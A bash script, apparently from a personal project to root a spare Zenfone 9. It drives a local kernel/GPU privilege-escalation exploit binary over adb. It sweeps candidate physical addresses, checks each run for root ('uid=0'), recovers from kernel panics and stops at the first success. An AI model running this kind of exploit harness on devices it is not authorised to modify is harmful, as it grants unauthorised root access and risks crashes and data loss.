#!/usr/bin/env bash
# sweep3.sh — crash-aware CHEESE_PHYADDR sweep with automatic post-reboot unlock.
# Device: spare Zenfone 9 (<SERIAL>), offline, media backed up, no account/PIN.
# NOTE: each MISS can perform 4-byte writes to wild physical addresses and may panic
# the kernel (observed). Bounded batches only.
set -u
S=${ZF9_SERIAL:?set ZF9_SERIAL to your device serial}
BIN=${BIN:-/data/local/tmp/cheese}
LOGDIR=$HOME/Dev/zenfone9-root/logs/sweep3-$(date +%Y%m%d-%H%M%S)
mkdir -p "$LOGDIR"
LIST=${1:?usage: sweep3.sh <candidate-file>}

unlock() {  # wake + dismiss keyguard; no PIN on device
  for i in $(seq 1 20); do
    adb -s "$S" wait-for-device 2>/dev/null
    adb -s "$S" shell 'test "$(getprop sys.boot_completed)" = 1' </dev/null 2>/dev/null && break
    sleep 4
  done
  adb -s "$S" shell 'input keyevent KEYCODE_WAKEUP; wm dismiss-keyguard' </dev/null >/dev/null 2>&1
  sleep 1
  adb -s "$S" shell 'dumpsys window displays | grep -c "mCurrentFocus=Window{.*Launcher" ' </dev/null 2>/dev/null
}
uptime_s() { adb -s "$S" shell 'cut -d. -f1 /proc/uptime' </dev/null 2>/dev/null | tr -d '\r'; }

mapfile -t CANDS < "$LIST"
echo "candidates: ${#CANDS[@]}  logdir: $LOGDIR"
unlock >/dev/null

i=0
for cand in "${CANDS[@]}"; do
  i=$((i+1))
  up_before=$(uptime_s)
  out=$(adb -s "$S" shell "CHEESE_NO_RETRY=1 CHEESE_PHYADDR=$cand timeout 75 $BIN id" </dev/null 2>&1)
  rc=$?
  echo "$out" > "$LOGDIR/cand-$cand.log"

  verdict="MISS"
  echo "$out" | grep -q "uid=0"        && verdict="*** ROOT ***"
  echo "$out" | grep -q "found it"     && verdict="TARGET-FOUND"
  echo "$out" | grep -q "read output"  && verdict="$verdict(READ-OK)"
  echo "$out" | grep -q "can't get GPU r/w" && verdict="$verdict(no-gpu-rw)"

  up_after=$(uptime_s)
  rebooted="no"
  if [ -n "$up_after" ] && [ -n "$up_before" ] && [ "$up_after" -lt "$up_before" ]; then
    rebooted="YES"
    unlock >/dev/null
  elif ! adb -s "$S" shell true </dev/null >/dev/null 2>&1; then
    rebooted="YES(unreachable)"
    unlock >/dev/null
  fi

  echo "[$i/${#CANDS[@]}] $cand -> $verdict  rc=$rc  rebooted=$rebooted"
  case "$verdict" in
    *ROOT*|*TARGET-FOUND*|*READ-OK*)
      echo ">>> POSITIVE RESULT at $cand — stopping. Log: $LOGDIR/cand-$cand.log"
      echo "$out" | tail -20
      break;;
  esac
  sleep 2
done
echo "sweep3 done: $i tried, logdir $LOGDIR"
